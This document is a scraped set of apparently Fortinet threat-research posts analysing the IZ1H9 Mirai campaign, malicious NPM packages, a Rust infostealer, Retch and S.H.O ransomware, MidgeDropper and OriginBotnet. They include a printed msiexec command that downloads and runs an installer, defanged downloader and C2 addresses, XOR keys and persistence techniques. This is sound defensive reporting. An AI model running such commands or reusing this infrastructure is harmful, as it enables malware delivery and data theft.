Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP), is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning, to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation.

    "link": "https://www.fortinet.com/blog/threat-research/Iz1h9-campaign-enhances-arsenal-with-scores-of-exploits",
    "content": "FortiGuard Labs Threat Research Affected Platforms:LinuxImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical In September 2023, our FortiGuard Labs team observed that the IZ1H9 Mirai-based DDoS campaign has aggressively updated its arsenal of exploits. Thirteen payloads were included in this variant, including D-Link devices, Netis wireless router, Sunhillo SureLine, Geutebruck IP camera, Yealink Device Management, Zyxel devices, TP-Link Archer, Korenix Jetwave, and TOTOLINK routers. Based on the trigger counts recorded by our IPS signatures, it is evident that peak exploitation occurred on September 6, with trigger counts ranging from the thousands to even tens of thousands. This highlights the campaign's capacity to infect vulnerable devices and dramatically expand its botnet through the swift utilization of recently released exploit code, which encompasses numerous CVEs. In this article, we will elaborate on how this threat leverages new vulnerabilities to control affected devices, along with the details of IZ1H9. Four payloads,CVE-2015-1187,CVE-2016-20017,CVE-2020-25506, andCVE-2021-45382, target D-Link vulnerabilities. These critical-severity vulnerabilities can allow remote attackers to deliver command injection via a crafted request. Another exploit,CVE-2019-19356, targets Netis WF2419. It focuses on exploiting a Remote Code Execution (RCE) vulnerability through the tracert diagnostic tool because of a lack of user input sanitizing. The payload injects in parameter “tools_ip_url” and contains the “User-Agent: Dark” header used in the Dark.IoT Botnet. The campaign also seeks to exploit vulnerabilities discovered in 2021, includingCVE-2021-36380, which affect Sunhillo SureLine versions before 8.7.0.1.1,CVE-2021-33544/33548/33549/33550/33551/33552/33553/33554, which allow arbitrary command execution within the parameters of various pages on Geutebruck products, andCVE-2021-27561/27562, which affect Yealink Device Management (DM) 3.6.0.20. The next exploit targets the Zyxel device’s/bin/zhttpd/ componentvulnerability. If insufficient input validation is found, the attacker can exploit the vulnerability to launch a remote code execution attack on Zyxel EMG3525/VMG1312 before V5.50. The threat actor has also incorporated vulnerabilities discovered in 2023 into their exploit payload list.CVE-2023-1389specifically targets TP-Link Archer AX21 (AX1800), whileCVE-2023-23295impacts Korenix JetWave wireless AP. CVE-2022-40475/25080/25079/25081/25082/25078/25084/25077/25076/38511/25075/25083collectively represent a set of related vulnerabilities that focus on TOTOLINK routers. The last one is an unclear exploit payload. It targets “/cgi-bin/login.cgi” and injects a payload in the “key” parameter. A similar vulnerability affects theProlink PRC2402M router, but it is missing a few parameters to achieve remote code execution. It is unclear if the IZ1H9 campaign misused this payload or if they intended to target other devices. The injected payload in the above vulnerabilities intends to get a shell script downloader “l.sh” from hxxp://194[.]180[.]48[.]100. When the script is executed, it begins by deleting logs to conceal its actions. It then downloads and executes various bot clients to cater to diverse Linux architectures. In the final step, the shell script downloader obstructs network connections on multiple ports. This is achieved by altering the device's iptables rules, as illustrated in Figure 9. IZ1H9, a Mirai variant, infects Linux-based networked devices, especially IoT devices, turning them into remote-controlled bots for large-scale network attacks. The XOR key to decode configuration is 0xBAADF00D, shown in Figure 10. The additional payload downloader URLs can be extracted from the decoded configuration in Figure 11, namely hxxp://2[.]56[.]59[.]215/i.sh and hxxp://212[.]192[.]241[.]72/lolol.sh. Both were employed in May 2023. IZ1H9 also includes a data section with pre-set login credentials for brute-force attacks. The XOR decoding key is 0x54, shown in Figure 12, and the decoded data is in Figure 13. As for the C2 communication, victims first send a check-in message with the parameter “l.expl” to the C2 server “194[.]180[.]48[.]101:5034,” and it responds with a keep-alive message “\\x00\\x00.” Once the compromised devices receive a command from the C2 server, shown in Figure 14, they parse the packet to determine the DDoS attack method, target host, and packet count, if specified, before launching the attack. The message structure is as follows: IoT devices have long been an attractive target for threat actors, with remote code execution attacks posing the most common and concerning threats to both IoT devices and Linux servers. The exposure of vulnerable devices can result in severe security risks. Despite the availability of patches for these vulnerabilities, the number of exploit triggers remains alarmingly high, often numbering in the thousands. What amplifies the impact of the IZ1H9 Campaign are the rapid updates to the vulnerabilities it exploits. Once an attacker gains control of a vulnerable device, they can incorporate these newly compromised devices into their botnet, enabling them to launch further attacks like DDoS attacks and brute-force. To counter this threat, it is strongly recommended that organizations promptly apply patches when available and always change default login credentials for devices. The malware described in this report are detected and blocked byFortiGuard Antivirusas: BASH/Mirai.AEH!tr.dldrELF/Mirai.AT!trELF/Mirai.GG!trLinux/Mirai.L!trLinux/Mirai.REAL!trLinux/Mirai.IZ1H9!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service.

    "title": "Malicious Packages Hidden in NPM",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-packages-hiddin-in-npm",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms where NPM packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, source code, etc.Severity level:High Over the past few months, the FortiGuard Labs team has discovered several malicious packages hidden in NPM (Node Package Manager), the largest software registry for the JavaScript programming language. These packages were found through a system dedicated to discover malicious open-source packages from various ecosystems e.g. PyPI, NPM. In this blog, we will look at some of these packages, grouping them based on similar styles of code or functions. In general, most of these malicious packages use install scripts that run pre or post-install. Whenever an NPM package is installed, those scripts are run as well. An example of this is shown below. Every package we found aims to steal sensitive data, such as system or user information, via a webhook or file-sharing link. Let’s explore the sets of packages below. This first set shows an obfuscated index.js script. However, we can identify some clues in the strings that may raise suspicions. Let’s try to simplify this code. After cleaning up the script, we can see it exfiltrates sensitive data, including Kubernetes configurations, SSH keys, and other critical information. It also gathers basic system fingerprinting details, like username, IP address, and hostname, without any prior warning. The index.js in this second set of packages sends an HTTP GET request to a specific URL, including query parameters. It scans for particular files and directories that may contain sensitive information. This script also enables the unauthorized extraction of critical developer data, including source code and configuration files. The targeted files and directories may contain highly valuable intellectual property and sensitive information, such as various application and service credentials. It then archives these files and directories and uploads the resulting archives to an FTP server. In this set, the index.mjs install script uses a Discord webhook to exfiltrate sensitive data, such as system information, username, and folder contents. As with the third set, this fourth set also uses an index.mjs install script and a Discord webhook to exfiltrate sensitive data. But this time, they use an alternate style of coding. This fifth set uses an index.js install script to exfiltrate host and username info and home users’ home directory contents via a webhook. This set—the most commonly found style—uses yet another index.js install script to exfiltrate information. In this set, the packages use an installer.js install script to carry out the attack, similar to the previous two, but we can see that the environment variable ‘NODE_TLS_REJECT_UNAUTHORIZED’ is set to ‘0’. This disables TLS certificate validation, which may make the connection insecure and vulnerable to man-in-the-middle attacks. This package automatically downloads and executes a potentially malicious executable file from a URL to a C:/ directory. This package uses another script style to gather system information, including the victim’s public IP address and then exfiltrates this information to a discord webhook. This blog groups together a collection of malicious NPM packages that use install scripts to steal users’ sensitive info based on styles of code or functions. End users should watch for packages that employ suspicious install scripts and exercise caution. We will continue hunting for and reporting malicious packages to help users avoid becoming victims.

    "link": "https://www.fortinet.com/blog/threat-research/threat-Actors-exploit-the-tensions-between-azerbaijan-and-armenia",
    "content": "FortiGuard Labs Threat Research In 1923, the Soviet Union created the Nagorno-Karabakh Autonomous Oblast (an oblast is an administrative region or province) within the Azerbaijan Soviet Socialist Republic. This oblast has a 95% ethnically Armenian population. In 1988, Nagorno-Karabakh declared its intention to leave Azerbaijan and join the neighboring Republic of Armenia. While the Soviet Union was able to keep the resulting tension under control, once the USSR began to collapse, armed conflict between Azerbaijan and Armenia began for control of the Nagorno-Karabakh region. While a ceasefire was tentatively reached in 1994 and again in 2020,tensions remain highbetween the two countries. Affected platforms:Microsoft WindowsImpacted parties:Targeted management associated with an Azerbaijanian companyImpact:Reconnaissance of basic computer info of targeted usersSeverity level:Low In August 2023, FortiGuard Labs discovered an infected memo pretending to come from the current president of a company in Azerbaijan and aimed at the management teams of associated businesses. Opening this memo downloads malware designed to gather basic information from its targets. This blog analyzes the attack chain, reviews the malware’s capabilities, and reveals the possible location of the threat actor behind it. FortiGuard Labs spotted this attack by finding the memo in Figure 2. The memo claims to have information about a border clash between soldiers from Azerbaijan and Armenia. The memo is in HTML format and usesHTML smugglingto automatically deliver a password-protected archive. This archive, as the memo suggests, contains several images. As shown in the attack diagram in Figure 3, the archive contains three clean images and one phony image. The actual contents are illustrated below. An astute observer may notice that the first \"image\" is not an image file. In reality, it is a .LNK shortcut that executes the following command: ..\\..\\Windows\\System32\\msiexec.exe /i \"https://dl[.]dropboxusercontent[.]com/scl/fi/zjxgh8ofdmfca8bpfntw9/karabakh.jpg.msi? rlkey=nidpjpx3ioigoq6qonibztwg4&dl=0\" This command downloads an .MSI (Microsoft Installer) file. Figure 3 shows this MS installer file performing two actions when clicked. The first action is to display an image with the same filename as the phony image shortcut (shown in the zip archive in Figure 4): This technique may fool some users into thinking the shortcut was simply an image file. But this is misdirection. Instead, the installer simultaneously loads hidden malware into the targeted computer. The malicious installer creates a new folder in the user’s %APPDATA% folder called “Windows Defender Health Check.” It also installs malware with the same name: C:\\Users\\[username]\\AppData\\Roaming\\Windows Defender Health Check\\WindowsDefenderHealthcheck.exe This malware is programmed in RUST, which is not the programming language of choice for most malware authors. This makes using standard analysis tools and methods somewhat less useful. The fact that RUST is used already makes this threat actor different. However, this is not the only trait that makes this malware distinct. For persistence, a temporary file is created called “24rp.xml.” This file is used to create a scheduled task. Once the scheduled task is created, the .XML file is deleted. This technique assumes that the intended targets leave their computers on overnight so the malware can execute outside regular office hours when it is less likely to be noticed. Moreover, for even greater stealth, the malware can sleep for random amounts of time when performing its tasks. Next, we will refer back to Figure 2 for another indication of how this malware attempts to stay hidden. Notice the memo is dated August 8th. By examining its compile timestamp, we found that this malware was created the previous day. This short timeframe makes it virtually impossible to accidentally release the malware before the attack starts. Ultimately, the malware acts like an infostealer, gathering basic computer information and sending it to a C2 server. The following commands are executed: These commands suggest that the threat actor is still in the early stages of attempting to fully compromise its targets. The information being gathered from these commands could be used to tailor specific attacks for each infected target. This infostealer is unique because it also collects a list of environment variables and takes an extra step to check for any proxy servers in use. Figure 10. Checking for proxy If a proxy server is set, the malware understands how to route its traffic. The malware issues a POST request to send the encrypted information it stole to a C2 server owned by the threat actor, 78[.]135.73.140, through port 35667. Our telemetry found nothing too interesting with the C2 server itself. However, digging into the server uncovered additional information. Using data from PDNS and other records, the C2 server 78[.]135.73.140 does not seem to be a shared server. This suggests the threat actor has total control and setup of the server. With this assumption, we searched to discover more of the threat actor’s network infrastructure. Inside the /24 subnet alone, four additional servers were revealed: Using the August 8thdate on the memo as a starting point, we searched traffic going to these servers in the month prior. While we did not find significant amounts of traffic, we identified one IP address in Colombia that connected to the server 78[.]135.73.188 in July on a port commonly used for VPN for a substantial amount of time. If the threat actor wanted to hide their activity, using a VPN server under their control would accomplish the job. The Colombia IP address belongs to a cellular company, which suggests the user may have been using a mobile hotspot. If so, this may be the location of the attacker. The threat actor in this campaign uses a few advanced techniques, including RUST and after-hours execution, to help it stay under the radar and make analysis more difficult. The size of the network infrastructure also suggests this threat actor is not a run-of-the-mill malware developer but someone with access to resources. And the use of a geopolitical rule indicates that this threat actor is plugged in and knows how to target specific users. Fortinet customers are already protected from these malware samples through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the relevant samples with the following AV signatures: The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Retch and S.H.O ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High Retch is a new ransomware variant first discovered in mid-August 2023. It encrypts files on compromised machines and leaves two ransom notes asking victims to pay a ransom for file decryption. Information about the infection vector used by the Retch ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. Retch ransomware samples have been submitted to a public file scanning service from the following countries: Once the ransomware runs, it looks for and encrypts files with the following file extensions: .txt, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .jpeg, .png, .csv, .sql, .mdb, .sln, .php, .asp, .aspx, .html, .xml, .psd, .mp4, .7z, .rar, .m4a, .wma, .avi, .wmv, .d3dbsp, .zip, .sie, .sum, .ibank, .t13, .t12, .qdf, .gdb, .tax, .pkpass, .bc6, .bc7, .bkp .qic, .bkf, .sidn, .sidd, .mddata, .itl, .itdb, .icxs, .hvpl, .hplg, .hkdb,   .mdbackup, .syncdb, .gho, .cas, .svg, .map, .wmo, .itm, .sb, .fos .mov, .vdf, .ztmp .sis, .sid, .ncf,           .menu, .layout, .dmp, .blob, .esm, .vcf, .vtf, .dazip, .fpk, .mlx, .kf, .iwd, .vpk, .tor, .psk, .rim, .w3x,        .fsh, .ntl, .arch00, .lvl, .snx, .cfr, .ff, .vpp_pc, .lrf, .m2, .mcmeta, .vfs0, .mpqge, .kdb, .db0, .dba, .rofl,  .hkx, .bar, .upk, .das, .iwi, .litemod, .asset, .forge, .ltx, .bsa, .apk, .re4, .sav, .lbf, .slm, .bik, .epk,           .rgss3a, .pak, .big, .wallet, .wotreplay, .xxx, .desc, .py, .m3u, .flv, .js, .css, .rb, .p7c, .pk7, .p7b, .p12, .pfx, .pem, .crt, .cer, .der, .x3f, .srw, .pef, .ptx, .r3d, .rw2, .rwl, .raw, .raf, .orf, .nrw, .mrwref, .mef, .erf, .kdc, .dcr, .cr2, .crw, .bay, .sr2, .srf, .arw, .3fr, .dng, .jpe, .jpg, .cdr, .indd, .ai, .eps, .pdf, .pdd, .dbf, .mdf, .wb2, .rtf, .wpd, .dxg, .xf, .dwg, .pst, .accdb, .pptm, .xlk, .xlsb, .xlsm, .wps, .docm, .odb, .odc, .odm, .odp, .ods, .cs, .exe, .lnk, .mpeg, .mp3, .mkv, .divx, .ogg, .wav, .bat, .index, .flac, .vob, .mpg The following directories are excluded from file encryption: The ransomware adds a “.Retch” extension to encrypted files. It then drops a ransom note labeled \"Message.txt\" in every folder where files are encrypted. In the ransom note, the Retch attacker asks victims to pay Bitcoins worth 300 euros for file decryption. Due to the low ransom demand, Retch ransomware is likely used to target consumers rather than enterprises. As shown in Figure 2, the ransom message is available in French and English, leading us to believe that the Retch ransomware primarily targets French users. However, further investigation revealed that this isn't the case. We also discovered that the ransom note dropped on the Desktop differs from “Message.txt.” The ransom note left on the Desktop is labeled “HOW TO RECOVER YOUR FILES.txt” and asks victims to pay Bitcoin worth $1000 for file decryption. This ransom note has a different contact email address and includes the attacker’s Bitcoin wallet address. It turns out that the Retch ransomware was developed based on a publicly available ransomware source code that claims to be for educational purposes, which appears to be based on a well-known open-source ransomware, “HiddenTear.” The open-source ransomware has the ransom note shown in Figure 2 by default. The attacker appears to have only customized the ransom note on the desktop, which is only in English, leaving the ransom notes in all other locations untouched. This indicates that the Retch ransomware was not targeting French users as we first thought. As mentioned, the countries from which the files were submitted to the public file scanning service are widespread, further suggesting our suspicion is correct. At the time of our investigation, the attacker’s Bitcoin wallet had not recorded any transactions. Information about the infection vector used by the S.H.O ransomware threat actor is not currently available. However, it is unlikely to be significantly different from other ransomware groups. S.H.O ransomware samples have been submitted to a public file scanning service from the following countries: After the ransomware runs, it encrypts files on compromised machines and adds five random letters and numbers as a file extension. S.H.O attempts to encrypt files with the following extensions: .myd, .ndf, .qry, .sdb, .sdf, .tmd, .tgz, .lzo, .txt, .jar, .dat, .contact, .settings, .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .jpg, .mka, .mhtml, .oqy, .png, .csv, .py, .sql, .indd, .cs, .mp3, .mp4, .dwg, .zip, .rar, .mov, .rtf, .bmp, .mkv, .avi, .apk, .lnk, .dib, .dic, .dif, .mdb, .php, .asp, .aspx, .html, .htm, .xml, .psd, .pdf, .xla, .cub, .dae, .divx, .iso, .7zip, .pdb, .ico, .pas, .db, .wmv, .swf, .cer, .bak, .backup, .accdb, .bay, .p7c, .exif, .vss, .raw, .m4a, .wma, .ace, .arj, .bz2, .cab, .gzip, .lzh, .tar, .jpeg, .xz, .mpeg, .torrent, .mpg, .core, .flv, .sie, .sum, .ibank, .wallet, .css, .js, .rb, .crt, .xlsm, .xlsb, .7z, .cpp, .java, .jpe, .ini, .blob, .wps, .docm, .wav, .3gp, .gif, .log, .gz, .config, .vb, .m1v, .sln, .pst, .obj, .xlam, .djvu, .inc, .cvs, .dbf, .tbi, .wpd, .dot, .dotx, .webm, .m4v, .amv, .m4p, .svg, .ods, .bk, .vdi, .vmdk, .onepkg, .accde, .jsp, .json, .xltx, .vsdx, .uxdc, .udl, .3ds, .3fr, .3g2, .accda, .accdc, .accdw, .adp, .ai, .ai3, .ai4, .ai5, .ai6, .ai7, .ai8, .arw, .ascx, .asm, .asmx, .avs, .bin, .cfm, .dbx, .dcm, .dcr, .pict, .rgbe, .dwt, .f4v, .exr, .kwm, .max, .mda, .mde, .mdf, .mdw, .mht, .mpv, .msg, .myi, .nef, .odc, .geo, .swift, .odm, .odp, .rar, .orf, .pfx, .p12, .pl, .pls, .safe, .tab, .vbs, .xlk, .xlm, .xlt, .xltm, .svgz, .slk, .tar.gz, .dmg, .ps, .psb, .tif, .rss, .key, .vob, .epsp, .dc3, .iff, .opt, .onetoc2, .nrw, .pptm, .potx, .potm,.pot, .xlw, .xps .xsd, .xsf, .xsl, .kmz, .accdr, .stm, .accdt, .ppam, .pps, .ppsm, .exe, .p7b, .wdb, .sqlite, .sqlite3, .dacpac, .zipx, .lzma, .z, .tar.xz, .pam, .r3d, .ova, .1c, .dt, .c, .vmx, .xhtml, .ckp, .db3, .dbc, .dbs, .dbt, .dbv, .frm, .mwb, .mrg, .txz, .mrg, .vbox, .wmf, .wim, .xtp2, .xsn, .xslt The following files are excluded in all directories: These directories are also excluded from having their contents encrypted: S.H.O encrypts each file using an RSA public key and the Microsoft “Rijndael Managed” C# library. Upon completing the encryption run, it replaces the Desktop wallpaper with its own that asks victims to find and read the file “readme.txt,” which is a ransom note. FortiGuard Labs has identified two S.H.O ransomware variants that leave different ransom notes. Although the ransom notes have different Bitcoin addresses belonging to the attacker, the ransom fee stays consistent at $200. The ransom messages have a very fearful and ominous tone that may be an attempt to scare victims into paying the ransom. Neither of the Bitcoin wallets was available at the time of our investigation. Fortinet customers are already protected from these malware variants through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the Retch ransomware samples with the following AV signature: FortiGuard Labs detects the S.H.O ransomware samples with the following AV signature: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3).

    "title": "New MidgeDropper Variant",
    "link": "https://www.fortinet.com/blog/threat-research/new-midgedropper-variant",
    "content": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium One of the most exciting aspects of malware analysis is coming across a family that is new or rare to the reversing community. Determining the function of the malware, who created it, and the reasons behind it become a mystery to solve. The previously unseen dropper variant we recently found, named MidgeDropper, has a complex infection chain that includes code obfuscation and sideloading, making it an interesting use case. Although we couldn’t obtain the final payload, this blog will still explore what makes this dropper tick. The initial infection vector was not available to FortiGuard Labs at the time of our investigation. However, we strongly suspect it to be a phishing e-mail because we have access to an RAR archive—!PENTING_LIST OF OFFICERS.rar—that would have been the likely attachment to an e-mail. Two files are in the !PENTING_LIST OF OFFICERS.rar archive: “Notice to Work-From-Home groups.pdf” and “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” (Figure 1). The “Notice to Work-From-Home groups.pdf” file is exactly what it appears to be: a PDF file. It contains an image of an error message that falsely indicates that the PDF document failed to load. It is designed to act as a decoy and shift the recipient’s attention to clicking on and executing the “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” file. Since file extensions are hidden by default in Windows, it is unlikely that anyone reviewing the contents would see the “.exe” and would instead assume they were opening another PDF file. At 6.7MB, the ”062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” file is large by malware delivery standards. This executable primarily functions as a dropper for the following stages of infection. The executable drops the files “Microsoft Office.doc,” “IC.exe,” “power.exe,” and “power.xml”. It also reaches out to “hXXp://185[.]225[.]68[.]37/jay/nl/seAgnt.exe” to pull down the file “seAgnt.exe.” This file is dropped and opened from “C:\\Users\\<user>\\AppData\\Local\\Temp\\Microsoft\\Office.” It is also meant to be a decoy. It is populated in some versions of the dropper, but it was empty and benign in the version analyzed by FortiGuard Labs. “IC.exe” is dropped by “062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe” and deposited into “C:\\ProgramData\\Emisoft\\Microsoft\\Stream\\IC.exe.” It is responsible for obtaining the next stage of the infection. “IC.exe” reaches out to a URL at “185[.]225[.]68[.]37” to download an additional file, “VCRUNTIME140_1.dll.” As can probably be guessed by the filename, “VCRUNTIME140_1.dll” is meant to appear as a file related to the Microsoft Visual C++ Redistributable Package. “power.exe” is dropped along with “power.xml” by ”062023_PENTING_LIST OF SUPERVISORY OFFICERS WHO STILL HAVE NOT REPORT.pdf.exe”.  “power.exe” only has one job: decoding and processing “power.xml.” Figure 9 shows that “power.xml” in its native format is obfuscated and not readily readable.  This can be easily rectified by removing the garbage characters used for obfuscation. With obfuscation removed, an XML document remains. Much of the information is irrelevant except for the final section under the “Actions” tag. The primary purpose of this pair of files is to launch “seAgnt.exe.” “seAgnt.exe” is a renamed copy of “GameBarFTServer.exe,” which is an application published by Microsoft, “Xbox Game Bar Full Trust COM Server.”  It is a background process for the Xbox Game Bar that runs on Windows. Although itself benign, “seAgnt.exe” does depend on “VCRUNTIME140_1.dll”.  This dependency allows the malicious code inside of the DLL to execute. “VCRUNTIME140_1.dll” is a legitimate DLL that is part of the Microsoft Visual C++ runtime package. Unfortunately, the particular version used here is malicious. Due to “VCRUNTIME140_1.dll” being a Dynamic Link Library, it doesn’t exist as a separate executable. It has to have assistance via another application to load its code into memory and execute it. “seAgnt.exe” is that application. This technique is called sideloading (https://attack.mitre.org/techniques/T1574/002/) because a dependency of a legitimate application is highjacked to allow the malicious code to load. The file is heavily obfuscated and designed to make analysis much more difficult. For example, the figure below shows the massive number of function jumps that attempt to hide the purpose of the code. The rest of the code makes it equally difficult to follow along in a disassembler. The primary purpose of the code appears to be reaching out to “hXXp://185[.]225[.]68[.]37/jay/nl/35g3498734gkb.dat” to pull down the file “35g3498734gkb.dat”. Oddly, “35g3498734gkb.dat” is identical to “VCRUNTIME140_1.dll” in terms of the file hash, so it’s unclear why the threat actor opted to pull it down again from the C2 node. Unfortunately, further links on the infection chain were taken down when our analysis began, preventing further analysis of any potential final payloads. Despite the final payload being unavailable before FortiGuard Labs could analyze it, this dropper made an interesting case study and provided a subject to watch out for.

    "link": "https://www.fortinet.com/blog/threat-research/originbotnet-spreads-via-malicious-word-document",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrencySeverity level:Critical In August, FortiGuard Labs obtained a Word document containing a malicious URL designed to entice victims to download a malware loader. This loader employs a binary padding evasion strategy that adds null bytes to increase the file's size to 400 MB. The payloads of this loader include OriginBotnet for keylogging and password recovery, RedLine Clipper for cryptocurrency theft, and AgentTesla for harvesting sensitive information. Figure 1 illustrates the comprehensive attack flow. In this blog, we examine the various stages of how the file is deployed and delve into the specifics of the malware it delivers. Aphishingemail delivers the Word document as an attachment, presenting a deliberately blurred image and a counterfeit reCAPTCHA (Figure 2) to lure the recipient into clicking on it. Clicking activates an embedded malicious link in the file “\\word_rels\\document.xml.rels,” as shown in Figure 3. The initial loader was acquired from https://bankslip[.]info/document/scancop20233108[.]exe. This file, written in .NET, deciphers the “Main_Project” resource data in “HealthInstitutionSimulation.Properties.Resources.resources.” It uses an XOR operation with the string “WdxDFWxcf09WXfVVjLwKKcccwnawf” and then 'Activator.CreateInstance()' to execute the decoded information. The decoding procedure is shown in Figure 4. The second stage uses the “Main Project.dll” with the entry point illustrated in Figure 5. In this stage, the code initiates a “Sleep()” function within “Delation()” and establishes persistence through the “Moschop()” function. It then loads Base64-encoded strings and uses the AES-CBC algorithm for decryption, retrieving a PowerShell command, as shown in Figure 6. To ensure persistence, it duplicates the EXE file into the directory “%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup” under the filename “audacity.exe.exe” to ensure that the file runs automatically even if the victim restarts their device. Following that, it employs the command “GetType(‘I.L’).GetMethod(‘U’)” to invoke a method from the DLL that was decrypted from the resources labeled “DataPresent.” This is passed to the third-stage payload, decrypted from the data within the resources labeled “Moss,” using the AES-ECB algorithm, as shown in Figure 7. The third stage uses “scancopper4647979413.exe,” which is another .NET executable file. It utilizes the “Activator.CreateInstance()” method to generate an instance decoded from the resources, “rumdisintegration.dat,” effectively triggering the execution of the fourth-stage file, “cargomind.dll.” It then uses the “CreateInstance()” method with two parameters: the object type for instantiation and an array of arguments to be transmitted to the created object. The fourth stage is represented by a DLL file, “cargomind.dll.” Its entry point is shown in Figure 9. It comprises three Base64-encoded strings intended for subsequent operations. The “Deserialize()” function, as shown in Figure 10, is responsible for decoding these strings, parsing the key-value pairs for each option, and ultimately returning a dictionary. Figure 11 displays the result obtained from “list2.” It reveals the existence of three tasks, each comprising six distinct options. Let's explore the options within “list2[0]” in detail: For the remaining two tasks in “list2,” the action is set to “b.” Consequently, it invokes the “ExecuteBinder()” function to decode data specified in the “r_k” option, as shown in Figure 14. The targeted files in this context are “newcrisp.dat” and “backyard.dat,” both sourced from the resources section of the prior stage, “scancopper46477979413.exe,” as shown in Figure 15. The initial malware originates from the URL https://softwarez[.]online/javau[.]exe. It is a .NET executable file that has been packed using SmartAssembly. Upon deciphering the resource data, we uncovered the ultimate payload, “RedLine Clipper,” as shown in Figure 16. RedLine Clipper (SHA256: 4617631b4497eddcbd97538f6712e06fabdb53af3181d6c1801247338bffaad3), also known as ClipBanker, specializes in stealing cryptocurrencies by manipulating the user's system clipboard activities to substitute the destination wallet address with one belonging to the attacker. The compromised version (Figure 17) supports cryptocurrencies, including Bitcoin, Ethereum, Dogecoin, Litecoin, Dashcoin, and Monero. It continually monitors the clipboard for a copied coin wallet address, which is typically lengthy and complex, making manual entry impractical. When a wallet address is detected on the clipboard, RedLine Clipper covertly alters it to match the attacker's wallet address. Ordinarily, cryptocurrency wallet 